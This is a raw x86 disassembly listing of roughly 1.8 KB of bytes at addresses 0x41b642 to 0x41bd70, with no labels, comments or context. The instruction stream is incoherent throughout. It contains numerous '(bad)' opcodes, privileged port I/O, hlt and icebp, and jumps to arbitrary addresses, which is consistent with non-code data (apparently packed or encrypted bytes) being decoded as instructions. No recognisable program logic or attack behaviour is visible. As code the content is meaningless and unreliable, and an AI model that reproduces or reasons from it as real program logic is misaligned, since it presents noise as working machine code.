  41b642:	sbb    ch,BYTE PTR [esp+esi*2]
  41b645:	xor    DWORD PTR [eax],0xba944536
  41b64b:	sbb    eax,0x6e19c6f3
  41b650:	aam    0xf0
  41b652:	popa   
  41b653:	sub    al,0xd3
  41b655:	mov    dl,cl
  41b657:	ret    
  41b658:	into   
  41b659:	push   ds
  41b65a:	ds jecxz 0x41b60d
  41b65d:	repz and esp,DWORD PTR es:[esp+eiz*4+0x5fedf149]
  41b666:	mov    bh,0xbc
  41b668:	and    ebx,DWORD PTR [edx+0xe35ee35]
  41b66e:	outs   dx,BYTE PTR ds:[esi]
  41b66f:	sub    dl,BYTE PTR [ecx]
  41b671:	or     ah,al
  41b673:	add    al,0xc0
  41b675:	jb     0x41b6a6
  41b677:	add    eax,0x809cbdd1
  41b67c:	lds    edi,FWORD PTR [ebx+esi*2-0x7cc47100]
  41b683:	cmp    al,0x20
  41b685:	xor    bl,BYTE PTR [ecx]
  41b687:	xlat   BYTE PTR ds:[ebx]
  41b688:	pop    ebx
  41b689:	clc    
  41b68a:	retf   0x641c
  41b68d:	outs   dx,DWORD PTR ds:[esi]
  41b68e:	arpl   WORD PTR [esi-0x3b],bx
  41b691:	in     eax,0x1b
  41b693:	neg    DWORD PTR [esi-0x1f4b5e8d]
  41b699:	mov    eax,0xce48af10
  41b69e:	xor    al,0xd5
  41b6a0:	loope  0x41b649
  41b6a2:	pop    esp
  41b6a3:	xchg   ebp,eax
  41b6a4:	imul   edx,esp,0xffffffe2
  41b6a7:	mov    ebx,0xf273401
  41b6ac:	iret   
  41b6ad:	jne    0x41b65e
  41b6af:	and    DWORD PTR [ebx-0x26e99fd8],edi
  41b6b5:	daa    
  41b6b6:	push   edi
  41b6b7:	adc    ebx,DWORD PTR [edx+0x21b0b569]
  41b6bd:	scas   al,BYTE PTR es:[edi]
  41b6be:	xchg   ebx,eax
  41b6bf:	xchg   ecx,eax
  41b6c0:	mov    edi,es
  41b6c2:	or     ebp,DWORD PTR [esi+0x533bde4b]
  41b6c8:	out    dx,eax
  41b6c9:	cwde   
  41b6ca:	jg     0x41b6bc
  41b6cc:	neg    BYTE PTR [ebx]
  41b6ce:	scas   eax,DWORD PTR es:[edi]
  41b6cf:	add    DWORD PTR [eax+0x20],edx
  41b6d2:	leave  
  41b6d3:	rol    ebp,cl
  41b6d5:	dec    esp
  41b6d6:	out    0xff,eax
  41b6d8:	push   0x753e9a2a
  41b6dd:	retf   0xd2a0
  41b6e0:	fdiv   DWORD PTR [ebp-0x591f2517]
  41b6e6:	aas    
  41b6e7:	in     eax,dx
  41b6e8:	in     al,0xfe
  41b6ea:	add    al,0x57
  41b6ec:	mov    BYTE PTR [esp+eax*8-0x38],bh
  41b6f0:	jecxz  0x41b6b6
  41b6f2:	pop    esp
  41b6f3:	or     esp,DWORD PTR [edx-0x27]
  41b6f6:	data16 and dh,BYTE PTR [esi]
  41b6f9:	and    edx,DWORD PTR [eax+0x1751121a]
  41b6ff:	xchg   dl,ah
  41b701:	pushf  
  41b702:	jle    0x41b6cd
  41b704:	inc    edi
  41b705:	pusha  
  41b706:	out    0x67,al
  41b708:	arpl   WORD PTR [edi-0x6c],bx
  41b70b:	scas   al,BYTE PTR es:[edi]
  41b70c:	adc    bh,cl
  41b70e:	ret    
  41b70f:	jne    0x41b6e5
  41b711:	pop    ds
  41b712:	sub    eax,0x348fef5c
  41b717:	test   BYTE PTR [edx-0xeaadc33],ah
  41b71d:	stos   BYTE PTR es:[edi],al
  41b71e:	(bad)  
  41b71f:	cs daa 
  41b721:	mov    eax,ds:0x90593258
  41b726:	jo     0x41b6cc
  41b728:	jle    0x41b725
  41b72a:	pop    ss
  41b72b:	adc    bh,ah
  41b72d:	inc    esi
  41b72e:	out    0x94,eax
  41b730:	dec    edx
  41b731:	sbb    dh,al
  41b733:	ins    DWORD PTR es:[edi],dx
  41b734:	or     eax,0xb018a008
  41b739:	leave  
  41b73a:	sub    BYTE PTR [esi+0x4a6be8d6],0x91
  41b741:	pop    edx
  41b742:	and    ebp,edi
  41b744:	push   esi
  41b745:	push   edx
  41b746:	or     DWORD PTR fs:[edi+0x52],eax
  41b74a:	sti    
  41b74b:	inc    edx
  41b74c:	cli    
  41b74d:	sub    edx,esp
  41b74f:	cmp    al,0xcb
  41b751:	jecxz  0x41b719
  41b753:	sbb    DWORD PTR [edi-0x39a7897c],ebp
  41b759:	fcom   QWORD PTR [eax-0x360661e8]
  41b760:	shl    DWORD PTR [eax+0x5bb873cb],cl
  41b766:	les    ebp,FWORD PTR [edi]
  41b768:	adc    al,0x92
  41b76a:	inc    edi
  41b76b:	imul   ecx,DWORD PTR [ebx-0x4e],0xffffffb6
  41b76f:	(bad)  
  41b771:	pop    es
  41b772:	shr    DWORD PTR [eax],1
  41b774:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b775:	dec    ebp
  41b776:	out    dx,eax
  41b777:	cdq    
  41b778:	pop    es
  41b779:	xor    eax,0xc7945755
  41b77e:	cld    
  41b77f:	xlat   BYTE PTR ds:[ebx]
  41b780:	imul   ebx,DWORD PTR [eax],0xffffffd8
  41b783:	sbb    edi,esp
  41b785:	mov    BYTE PTR [ebp+0x394a98bb],cl
  41b78b:	jg     0x41b795
  41b78d:	mov    ch,0x29
  41b78f:	loop   0x41b791
  41b791:	hlt    
  41b792:	push   cs
  41b793:	cmp    eax,0xb8bb17d9
  41b798:	aad    0x34
  41b79a:	in     al,dx
  41b79b:	add    DWORD PTR [eax],0xffffff9c
  41b79e:	mov    ecx,0xc75b97b
  41b7a3:	in     eax,0x9f
  41b7a5:	out    dx,al
  41b7a6:	fmul   DWORD PTR [ebp-0x6a]
  41b7a9:	ss push ss
  41b7ab:	loope  0x41b77d
  41b7ad:	fist   DWORD PTR [ecx]
  41b7af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b7b0:	push   es
  41b7b1:	in     eax,0xa6
  41b7b3:	popa   
  41b7b4:	jmp    0x85b4:0x48ab4e11
  41b7bb:	pop    ebp
  41b7bc:	out    dx,eax
  41b7bd:	jecxz  0x41b773
  41b7bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b7c0:	sub    ch,BYTE PTR [eax]
  41b7c2:	fistp  DWORD PTR ds:0x4436cf1d
  41b7c8:	nop
  41b7c9:	or     eax,ecx
  41b7cb:	inc    ebp
  41b7cc:	cli    
  41b7cd:	dec    ebp
  41b7ce:	jno    0x41b7e4
  41b7d0:	inc    esi
  41b7d1:	js     0x41b786
  41b7d3:	ins    BYTE PTR es:[edi],dx
  41b7d4:	mov    ah,0x44
  41b7d6:	jl     0x41b845
  41b7d8:	rcr    BYTE PTR [edi+0x2],0x69
  41b7dc:	retf   
  41b7dd:	and    bh,dh
  41b7df:	push   cs
  41b7e0:	lods   eax,DWORD PTR ds:[esi]
  41b7e1:	pusha  
  41b7e2:	(bad)  [esi+0x73]
  41b7e5:	test   eax,0x88c1a6c7
  41b7ea:	cmc    
  41b7eb:	aam    0x4f
  41b7ed:	xchg   ecx,eax
  41b7ee:	push   ecx
  41b7ef:	(bad)  
  41b7f0:	sub    DWORD PTR [ebx-0x72c040e1],esi
  41b7f6:	add    edi,eax
  41b7f8:	or     DWORD PTR [eax+0x77ea57fc],esi
  41b7fe:	stos   DWORD PTR es:[edi],eax
  41b7ff:	repz xor BYTE PTR ds:0xc5ff8fe8,bl
  41b806:	push   ecx
  41b807:	or     al,0xc9
  41b809:	xor    DWORD PTR [edi+ebp*8+0xe],0xa
  41b80e:	into   
  41b80f:	scas   eax,DWORD PTR es:[edi]
  41b810:	and    BYTE PTR [esi+0x1a],dl
  41b813:	add    bl,BYTE PTR gs:[edx-0x80]
  41b817:	and    ebx,DWORD PTR [edi-0x5ec48736]
  41b81d:	imul   ebp,DWORD PTR [eax+0x6c],0xbc2b3f3
  41b824:	push   ss
  41b825:	and    DWORD PTR [eax+0x6fcb367f],ebp
  41b82b:	dec    eax
  41b82c:	shl    ah,cl
  41b82e:	jns    0x41b816
  41b830:	and    DWORD PTR es:[esi],0x95b8064
  41b837:	push   ebx
  41b838:	add    DWORD PTR [ecx+ebx*1],esp
  41b83b:	stc    
  41b83c:	lea    ebp,[ebp+0x14b17cb]
  41b842:	push   ss
  41b843:	and    edi,0xffffffd6
  41b846:	mov    WORD PTR [edi+0x19],gs
  41b849:	cwde   
  41b84a:	das    
  41b84b:	daa    
  41b84c:	ins    DWORD PTR es:[edi],dx
  41b84d:	sbb    al,0x97
  41b84f:	push   edx
  41b850:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b851:	lahf   
  41b852:	jno    0x41b7f1
  41b854:	pop    esp
  41b855:	icebp  
  41b856:	(bad)  
  41b857:	add    DWORD PTR [eax-0x14],0xea81c978
  41b85e:	outs   dx,BYTE PTR ds:[esi]
  41b85f:	mov    edx,0xfda958bf
  41b864:	pop    edi
  41b865:	loop   0x41b8e1
  41b867:	mov    al,ds:0x906fc9b8
  41b86c:	add    ch,ch
  41b86e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b86f:	(bad)  
  41b870:	pop    ds
  41b871:	test   DWORD PTR [eax-0x684a76e0],0x71a41c0a
  41b87b:	lds    edx,FWORD PTR [eax-0x4213c776]
  41b881:	xor    dh,dl
  41b883:	xchg   BYTE PTR [ebp-0x70],dh
  41b886:	xchg   ebx,eax
  41b887:	popf   
  41b888:	jecxz  0x41b8df
  41b88a:	dec    ebp
  41b88b:	lock out dx,eax
  41b88d:	jg     0x41b8d9
  41b88f:	xor    esp,ebx
  41b891:	pop    edx
  41b892:	push   cs
  41b893:	xor    eax,0x20c7a5af
  41b898:	hlt    
  41b899:	jl     0x41b867
  41b89b:	daa    
  41b89c:	xor    al,0x43
  41b89e:	mov    ds:0x3e77b964,eax
  41b8a3:	inc    ecx
  41b8a4:	cmp    al,0xf5
  41b8a6:	cmp    eax,0x957007da
  41b8ab:	jnp    0x41b90e
  41b8ad:	pushf  
  41b8ae:	xor    dh,BYTE PTR [ebp+0x1d0452dc]
  41b8b4:	push   ebx
  41b8b5:	or     al,0xd3
  41b8b7:	xchg   edx,eax
  41b8b8:	retf   0x73c3
  41b8bb:	pop    edx
  41b8bc:	mov    edi,0x6135d88e
  41b8c1:	out    dx,eax
  41b8c2:	ja     0x41b90a
  41b8c4:	outs   dx,BYTE PTR ds:[esi]
  41b8c5:	adc    edi,DWORD PTR [edi+0x2b5ce787]
  41b8cb:	lods   eax,DWORD PTR ds:[esi]
  41b8cc:	push   ecx
  41b8cd:	cmp    esp,DWORD PTR [esi+0xc1d2289]
  41b8d3:	pop    ecx
  41b8d4:	mov    BYTE PTR [edx+0x77],0x6d
  41b8d8:	add    dh,BYTE PTR [ebx+ebp*8-0x448de4f4]
  41b8df:	or     al,0x3d
  41b8e1:	sub    eax,0x4ea9274d
  41b8e6:	das    
  41b8e7:	rcr    DWORD PTR [ebp+0x26],0xd3
  41b8eb:	push   ds
  41b8ec:	mov    bh,0x6e
  41b8ee:	mov    al,ds:0x5ac87c3f
  41b8f3:	jmp    0x41b92f
  41b8f5:	lahf   
  41b8f6:	leave  
  41b8f7:	cmovae esi,DWORD PTR [ecx]
  41b8fa:	sar    BYTE PTR [esi],cl
  41b8fc:	pop    ss
  41b8fd:	outs   dx,DWORD PTR ds:[esi]
  41b8fe:	call   0x3ad6db04
  41b903:	xchg   edi,eax
  41b904:	adc    ebx,DWORD PTR [ebx-0x2f]
  41b907:	idiv   BYTE PTR [ebp-0x4b]
  41b90a:	and    eax,0xadd687f0
  41b90f:	(bad)  
  41b910:	js     0x41b8b3
  41b912:	les    ebx,FWORD PTR [esi]
  41b914:	and    bh,BYTE PTR ds:0xb6d85af2
  41b91a:	dec    ebp
  41b91b:	pushf  
  41b91c:	pop    ss
  41b91d:	mov    ds:0xd0db0181,al
  41b922:	daa    
  41b923:	xchg   esp,eax
  41b924:	pop    eax
  41b925:	and    BYTE PTR [edi],0xb9
  41b928:	inc    ecx
  41b929:	lock xor edx,eax
  41b92c:	bound  edx,QWORD PTR [edx+0x24]
  41b92f:	sbb    DWORD PTR ds:0xddc20ef6,0x10
  41b936:	jecxz  0x41b8be
  41b938:	mov    ch,0xdf
  41b93a:	loope  0x41b94d
  41b93c:	mov    ds:0xa975ef6c,al
  41b941:	xor    BYTE PTR [edx+0x6eab5eea],dh
  41b947:	mov    cl,0xf8
  41b949:	je     0x41b907
  41b94b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b94c:	aam    0xdb
  41b94e:	mov    eax,ds:0x420d69ce
  41b953:	out    dx,al
  41b954:	dec    edi
  41b955:	mov    ch,0x9a
  41b957:	fs dec ebx
  41b959:	nop
  41b95a:	test   BYTE PTR ds:0x6f47207e,ch
  41b960:	stc    
  41b961:	xchg   esp,eax
  41b962:	(bad)  
  41b963:	fisub  DWORD PTR [esi-0x5c5166d9]
  41b969:	pop    ds
  41b96a:	test   DWORD PTR [ebp-0x508a0f08],edi
  41b970:	push   edx
  41b971:	les    edx,FWORD PTR [esi+ebx*2-0x22]
  41b975:	xchg   ebx,eax
  41b976:	cmp    BYTE PTR [eax-0x4b],ah
  41b979:	sub    al,0xd6
  41b97b:	dec    edi
  41b97c:	xor    edi,DWORD PTR [esi+edx*4]
  41b97f:	mov    BYTE PTR [ebp+0x56a5b173],dh
  41b985:	mov    ecx,0x769e315c
  41b98a:	pop    edx
  41b98b:	and    eax,DWORD PTR [esi]
  41b98d:	or     al,0x7c
  41b98f:	mov    ah,0x68
  41b991:	fs inc esi
  41b993:	adc    BYTE PTR [edi+0x2adb0d79],0x2e
  41b99a:	adc    eax,0xab51c1e4
  41b99f:	sub    edx,eax
  41b9a1:	dec    BYTE PTR [ecx]
  41b9a3:	xor    al,0x65
  41b9a5:	xchg   ecx,eax
  41b9a6:	and    esi,DWORD PTR [edi+esi*2]
  41b9a9:	push   ebx
  41b9aa:	mov    DWORD PTR [edi-0xa],esp
  41b9ad:	pop    esi
  41b9ae:	pushf  
  41b9af:	(bad)  
  41b9b0:	xadd   DWORD PTR [edx-0x1c],eax
  41b9b4:	mov    DWORD PTR [edx],edi
  41b9b6:	pop    edi
  41b9b7:	pop    ss
  41b9b8:	and    BYTE PTR fs:[eax-0x2a],bl
  41b9bc:	loop   0x41b9d8
  41b9be:	jb     0x41b982
  41b9c0:	xor    ebx,DWORD PTR [edi+0x25]
  41b9c3:	mov    eax,0xd8f59c3
  41b9c8:	test   BYTE PTR [ebp+0x24],ch
  41b9cb:	jb     0x41b9a1
  41b9cd:	cmp    DWORD PTR [edi+0x47293056],ecx
  41b9d3:	jo     0x41b965
  41b9d5:	mov    WORD PTR [edx-0x28],gs
  41b9d8:	dec    edi
  41b9d9:	xchg   ebx,eax
  41b9da:	adc    DWORD PTR [ecx-0x2de64491],ebx
  41b9e0:	xor    BYTE PTR [esp+edi*8],ch
  41b9e3:	or     BYTE PTR ds:0xa30ad6f6,ah
  41b9e9:	fs xchg edx,eax
  41b9eb:	and    DWORD PTR [edx],edx
  41b9ed:	adc    edi,DWORD PTR [ebx]
  41b9ef:	lahf   
  41b9f0:	ins    BYTE PTR es:[edi],dx
  41b9f1:	pop    ebp
  41b9f2:	test   BYTE PTR [ebp+0x67705084],dh
  41b9f8:	add    eax,0x765f1f2f
  41b9fd:	leave  
  41b9fe:	imul   eax,edi,0xe161025f
  41ba04:	jb     0x41b9ec
  41ba06:	(bad)  
  41ba07:	pop    edi
  41ba08:	xor    ah,BYTE PTR ds:0x816d71dc
  41ba0e:	sub    BYTE PTR [ebx+0x12],0xd1
  41ba12:	add    ch,ah
  41ba14:	mov    ah,0xd9
  41ba16:	cli    
  41ba17:	add    edx,DWORD PTR [edx+edx*1+0x2]
  41ba1b:	cld    
  41ba1c:	stc    
  41ba1d:	leave  
  41ba1e:	jmp    0xc4248cc5
  41ba23:	sub    eax,0x2b824f93
  41ba28:	adc    eax,0x958da9ba
  41ba2d:	std    
  41ba2e:	mov    ah,0x8
  41ba30:	adc    eax,0xb8e92886
  41ba35:	mov    al,0xe
  41ba37:	ins    BYTE PTR es:[edi],dx
  41ba38:	js     0x41b9e1
  41ba3a:	mov    ebx,0x88c2f0b9
  41ba3f:	sub    BYTE PTR [edx],ch
  41ba41:	sub    ch,dh
  41ba43:	repnz enter 0xad80,0x45
  41ba48:	std    
  41ba49:	mov    ds:0x20bb6da4,eax
  41ba4e:	fwait
  41ba4f:	jl     0x41b9d2
  41ba51:	jmp    0xee68b081
  41ba56:	sub    eax,0x6914b3cd
  41ba5b:	imul   ecx,DWORD PTR [eax-0x2329e7dd],0x2f245ffd
  41ba65:	xchg   ecx,eax
  41ba66:	xor    esp,ebp
  41ba68:	loop   0x41ba78
  41ba6a:	pop    ds
  41ba6b:	les    eax,FWORD PTR [ebp+0x47]
  41ba6e:	lahf   
  41ba6f:	addr16 and eax,0x9aa2bb96
  41ba75:	add    DWORD PTR [edx+0x7e],ecx
  41ba78:	adc    DWORD PTR [ecx+0x15],ebp
  41ba7b:	imul   edi,edx,0xffffffc8
  41ba7e:	pop    ss
  41ba7f:	mov    ebx,0xe1a20846
  41ba84:	cdq    
  41ba85:	push   cs
  41ba86:	mov    eax,gs
  41ba88:	mov    esp,0xd4c0a392
  41ba8d:	push   edi
  41ba8e:	outs   dx,DWORD PTR ds:[esi]
  41ba8f:	xchg   ecx,eax
  41ba90:	and    ah,BYTE PTR [ecx-0x31]
  41ba93:	and    al,0x43
  41ba95:	(bad)  
  41ba96:	mov    ebp,0x81a6445e
  41ba9b:	sahf   
  41ba9c:	js     0x41bab5
  41ba9e:	jge    0x41bab1
  41baa0:	outs   dx,BYTE PTR ds:[esi]
  41baa1:	lds    eax,FWORD PTR [edx+eiz*8+0x1ce36cfa]
  41baa8:	nop
  41baa9:	mov    WORD PTR [esi+0x4b],gs
  41baac:	pop    esp
  41baad:	and    edx,DWORD PTR [ebx+ebx*2]
  41bab0:	xchg   ebx,eax
  41bab1:	je     0x41ba5d
  41bab3:	dec    edx
  41bab4:	cmp    eax,0xb878942
  41bab9:	adc    eax,0x23159016
  41babe:	inc    bh
  41bac0:	push   edi
  41bac1:	mov    al,0xda
  41bac3:	repz in al,0x4b
  41bac6:	sub    ecx,DWORD PTR [edi+eiz*8+0x63]
  41baca:	lock arpl WORD PTR [ebp+ebx*4-0x7e],bx
  41bacf:	les    edx,FWORD PTR [edi]
  41bad1:	pushf  
  41bad2:	pusha  
  41bad3:	out    dx,al
  41bad4:	loop   0x41bb39
  41bad6:	mov    WORD PTR [ebp-0x1bb58fbe],ss
  41badc:	adc    al,0x8
  41bade:	xor    edx,DWORD PTR [edx+0x54486d11]
  41bae4:	sub    bh,dl
  41bae6:	cmc    
  41bae7:	add    al,BYTE PTR [edi-0x75d96858]
  41baed:	js     0x41bb19
  41baef:	in     al,0x64
  41baf1:	mov    ecx,0xc9e4be65
  41baf6:	pop    esp
  41baf7:	rcr    dl,1
  41baf9:	mov    al,0xe3
  41bafb:	fcomi  st,st(3)
  41bafd:	lods   eax,DWORD PTR ds:[esi]
  41bafe:	icebp  
  41baff:	out    dx,eax
  41bb00:	and    dl,BYTE PTR [ebp-0x6f332607]
  41bb06:	aas    
  41bb07:	lods   eax,DWORD PTR ds:[esi]
  41bb08:	stos   BYTE PTR es:[edi],al
  41bb09:	fimul  DWORD PTR [edx+0x2d]
  41bb0c:	hlt    
  41bb0d:	xchg   ebp,eax
  41bb0e:	sub    al,0x89
  41bb10:	inc    edx
  41bb11:	sbb    ah,BYTE PTR [ecx]
  41bb13:	push   edx
  41bb14:	daa    
  41bb15:	mov    ebp,0x5044839d
  41bb1a:	in     eax,0xfc
  41bb1c:	mov    ebx,0x7fdbc4d2
  41bb21:	mov    ah,0x10
  41bb23:	leave  
  41bb24:	sub    eax,0xfbf9c34b
  41bb29:	push   ebx
  41bb2a:	or     bl,dl
  41bb2c:	pop    edx
  41bb2d:	jnp    0x41bb98
  41bb2f:	jle    0x41bb90
  41bb31:	jnp    0x41bae5
  41bb33:	dec    edx
  41bb34:	sbb    DWORD PTR [ebp-0x7b],0x59d68c66
  41bb3b:	test   eax,0x1d509e4
  41bb40:	ror    DWORD PTR [edi],1
  41bb42:	enter  0xceae,0x8
  41bb46:	jp     0x41bbbf
  41bb48:	(bad)  
  41bb49:	retf   
  41bb4a:	addr16 mov edx,0xd535a8be
  41bb50:	adc    BYTE PTR [ecx-0x18],al
  41bb53:	gs mov dl,0xa6
  41bb56:	fdiv   QWORD PTR [ecx+0x58]
  41bb59:	adc    DWORD PTR [ecx-0x71fd0341],ebp
  41bb5f:	pop    esi
  41bb60:	mov    eax,cs:0xa39a95d4
  41bb66:	mov    eax,0x6bd1ca8b
  41bb6b:	sbb    bh,BYTE PTR [edx-0x3d]
  41bb6e:	adc    eax,ecx
  41bb70:	out    0xba,eax
  41bb72:	mov    bl,0xaf
  41bb74:	mov    bh,0x3a
  41bb76:	ret    0x7908
  41bb79:	aam    0xe7
  41bb7b:	jns    0x41bbba
  41bb7d:	mov    ds:0xc6ccb3e9,al
  41bb82:	push   edi
  41bb83:	dec    eax
  41bb84:	sbb    eax,0x96afb65c
  41bb89:	add    DWORD PTR [ebx],edi
  41bb8b:	fcom   QWORD PTR [eax]
  41bb8d:	xor    BYTE PTR [edi-0x4778eee7],al
  41bb93:	jmp    0x41bbf1
  41bb95:	aas    
  41bb96:	sub    DWORD PTR [ebx],edi
  41bb98:	lods   eax,DWORD PTR ds:[esi]
  41bb99:	pushf  
  41bb9a:	mov    ds,WORD PTR [esi]
  41bb9c:	and    BYTE PTR [eax+0x6c],al
  41bb9f:	fsqrt  
  41bba1:	aam    0x75
  41bba3:	inc    esp
  41bba4:	(bad)  
  41bba5:	xor    ebp,DWORD PTR [ebp+0x4ff01982]
  41bbab:	mov    ds:0x78e32b83,eax
  41bbb0:	inc    ecx
  41bbb1:	or     esp,DWORD PTR [edx+0xc]
  41bbb4:	push   edi
  41bbb5:	jg     0x41bb5e
  41bbb7:	push   ds
  41bbb8:	sub    dl,al
  41bbba:	mov    ds:0x4b1ce8a8,eax
  41bbbf:	ins    BYTE PTR es:[edi],dx
  41bbc0:	in     al,dx
  41bbc1:	fisub  WORD PTR [ebx]
  41bbc3:	sub    edi,DWORD PTR [edi]
  41bbc5:	sub    DWORD PTR [edx+0x7c],eax
  41bbc8:	pop    ecx
  41bbc9:	data16 xor bl,ch
  41bbcc:	sbb    BYTE PTR [ebx+0x65eb4c17],bh
  41bbd2:	or     DWORD PTR [edi-0xe],ebp
  41bbd5:	dec    ebx
  41bbd6:	jnp    0x41bc48
  41bbd8:	fcom   QWORD PTR [esi]
  41bbda:	xor    ecx,DWORD PTR [edi+0x11461326]
  41bbe0:	xlat   BYTE PTR ds:[ebx]
  41bbe1:	jnp    0x41bc56
  41bbe3:	xlat   BYTE PTR ds:[ebx]
  41bbe4:	outs   dx,BYTE PTR cs:[esi]
  41bbe6:	pop    esi
  41bbe7:	push   ecx
  41bbe8:	fdiv   QWORD PTR [esi-0x10]
  41bbeb:	jmp    0x5b5f9129
  41bbf0:	sbb    al,0x2d
  41bbf2:	scas   eax,DWORD PTR es:[edi]
  41bbf3:	cmp    dh,BYTE PTR [edi-0x15fae829]
  41bbf9:	mov    ds:0xfa1d94b4,al
  41bbfe:	mov    eax,DWORD PTR [eax]
  41bc00:	loope  0x41bc4b
  41bc02:	adc    dh,dl
  41bc04:	xchg   BYTE PTR [ecx],al
  41bc06:	rcl    BYTE PTR [ecx],1
  41bc08:	jge    0x41bc1c
  41bc0a:	ss sbb esp,edx
  41bc0d:	in     eax,dx
  41bc0e:	scas   al,BYTE PTR es:[edi]
  41bc0f:	dec    ecx
  41bc10:	or     BYTE PTR [ebx+0x6e],al
  41bc13:	sbb    ebx,edi
  41bc15:	push   ss
  41bc16:	imul   edi,DWORD PTR [eax+0x2757155f],0xfffffff4
  41bc1d:	ret    0xe532
  41bc20:	add    DWORD PTR [edx+0x6dd7638b],0xa68e793a
  41bc2a:	mov    WORD PTR [bx-0x43fb],es
  41bc2f:	pop    ecx
  41bc30:	inc    edi
  41bc31:	mov    edx,DWORD PTR [ecx+0x1b22d9e9]
  41bc37:	inc    ecx
  41bc38:	xchg   esp,eax
  41bc39:	mov    WORD PTR [ebx],?
  41bc3b:	or     al,0x2c
  41bc3d:	imul   eax,esp,0xfffffff9
  41bc40:	jge    0x41bc74
  41bc42:	jne    0x41bc34
  41bc44:	add    DWORD PTR [ecx],ebx
  41bc46:	aam    0xbf
  41bc48:	cs daa 
  41bc4a:	push   0xffffffcd
  41bc4c:	adc    bl,BYTE PTR [eax-0x497f6cff]
  41bc52:	imul   esi,DWORD PTR [esi],0x72
  41bc55:	shr    BYTE PTR [ecx-0xcfcaf1f],cl
  41bc5b:	push   ds
  41bc5c:	popa   
  41bc5d:	xor    dh,cl
  41bc5f:	scas   eax,DWORD PTR es:[edi]
  41bc60:	test   DWORD PTR [eax],esp
  41bc62:	xor    eax,0x361189b9
  41bc67:	(bad)  
  41bc68:	in     eax,0xd0
  41bc6a:	pop    esi
  41bc6b:	out    dx,al
  41bc6c:	clc    
  41bc6d:	add    BYTE PTR [edi+0x7204004d],dl
  41bc73:	pop    es
  41bc74:	stos   DWORD PTR es:[edi],eax
  41bc75:	loopne 0x41bc41
  41bc77:	jmp    0x83adb5b4
  41bc7c:	loop   0x41bc2b
  41bc7e:	loop   0x41bcac
  41bc80:	and    al,0xfc
  41bc82:	jbe    0x41bc0e
  41bc84:	jmp    0x41bc71
  41bc86:	add    ah,BYTE PTR [ebx]
  41bc88:	push   esp
  41bc89:	jle    0x41bc1e
  41bc8b:	sar    DWORD PTR [esi-0x7d],cl
  41bc8e:	out    dx,eax
  41bc8f:	ret    
  41bc90:	ret    
  41bc91:	xchg   edi,eax
  41bc92:	lds    eax,FWORD PTR [esi]
  41bc94:	imul   ecx,edx,0xfb204289
  41bc9a:	xchg   DWORD PTR [edi],edx
  41bc9c:	stos   BYTE PTR es:[edi],al
  41bc9d:	pop    ebp
  41bc9e:	xor    ecx,DWORD PTR [esi+esi*2]
  41bca1:	ret    
  41bca2:	and    BYTE PTR [ebp+0xca93e54],ch
  41bca8:	sub    edi,DWORD PTR [eax+edx*2+0x10]
  41bcac:	push   eax
  41bcad:	pop    edx
  41bcae:	lahf   
  41bcaf:	jl     0x41bc3d
  41bcb1:	stos   BYTE PTR es:[edi],al
  41bcb2:	sub    al,0x76
  41bcb4:	jbe    0x41bcd4
  41bcb6:	dec    ebp
  41bcb7:	in     eax,0x9d
  41bcb9:	enter  0x7353,0x7a
  41bcbd:	stos   DWORD PTR es:[edi],eax
  41bcbe:	in     al,0xcc
  41bcc0:	xchg   edi,eax
  41bcc1:	sti    
  41bcc2:	xor    eax,0xaf50c203
  41bcc7:	(bad)  
  41bcc9:	mov    ecx,0xedb0d55d
  41bcce:	jg     0x41bc62
  41bcd0:	xor    al,0xdd
  41bcd2:	dec    esp
  41bcd3:	ins    BYTE PTR es:[edi],dx
  41bcd4:	and    dl,BYTE PTR [edi]
  41bcd6:	test   ah,dh
  41bcd8:	cmp    eax,0x2138ed41
  41bcdd:	sbb    ebp,edx
  41bcdf:	stos   DWORD PTR es:[edi],eax
  41bce0:	cld    
  41bce1:	sub    eax,0x23ff7ed3
  41bce6:	fcomi  st,st(0)
  41bce8:	and    DWORD PTR [edi],ebx
  41bcea:	or     ebx,DWORD PTR [esi+0x12]
  41bced:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bcee:	add    ebp,DWORD PTR [ecx]
  41bcf0:	or     DWORD PTR [ebp+0x643012e9],ecx
  41bcf6:	and    dl,BYTE PTR [ebx-0x16]
  41bcf9:	(bad)
  41bcfd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bcfe:	out    0xf7,eax
  41bd00:	ror    DWORD PTR [esi+0x7ab563cb],cl
  41bd06:	rcl    DWORD PTR [ebp+0x1eee445d],1
  41bd0c:	push   ebx
  41bd0d:	push   ebp
  41bd0e:	add    al,0x66
  41bd10:	mov    bl,0x32
  41bd12:	stos   DWORD PTR es:[edi],eax
  41bd13:	retf   
  41bd14:	(bad)  
  41bd15:	js     0x41bd35
  41bd17:	mov    DWORD PTR [ecx-0x51],edi
  41bd1a:	mov    ds,WORD PTR [eax+eiz*2]
  41bd1d:	sbb    BYTE PTR [ebx],bh
  41bd1f:	lahf   
  41bd20:	xor    eax,0x287cd680
  41bd25:	mov    edi,0x13e58a50
  41bd2a:	gs jecxz 0x41bda0
  41bd2d:	sbb    eax,0x155dfb98
  41bd32:	cmp    edx,DWORD PTR [ebp+ecx*4+0x72d57e8]
  41bd39:	push   ebx
  41bd3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd3b:	adc    BYTE PTR [ecx],dh
  41bd3d:	and    DWORD PTR [esi+ecx*1+0x78],esi
  41bd41:	shl    BYTE PTR [ebp+0x11],cl
  41bd44:	mov    ebp,0x33bc6fdc
  41bd49:	jo     0x41bd95
  41bd4b:	cdq    
  41bd4c:	xchg   edx,eax
  41bd4d:	xchg   ecx,eax
  41bd4e:	sub    eax,esi
  41bd50:	ins    DWORD PTR es:[edi],dx
  41bd51:	push   ebx
  41bd52:	(bad)  
  41bd53:	push   ss
  41bd54:	adc    ebx,DWORD PTR ds:0x8ee6d195
  41bd5a:	call   0xe95dd9c
  41bd5f:	pop    esp
  41bd60:	or     eax,0x5914b9c4
  41bd65:	push   eax
  41bd66:	adc    BYTE PTR [edi],dl
  41bd68:	addr16 lock mov dl,0x18
  41bd6c:	push   edi
  41bd6d:	cdq    
  41bd6e:	lods   al,BYTE PTR fs:[esi]
  41bd70:	gs (bad) 
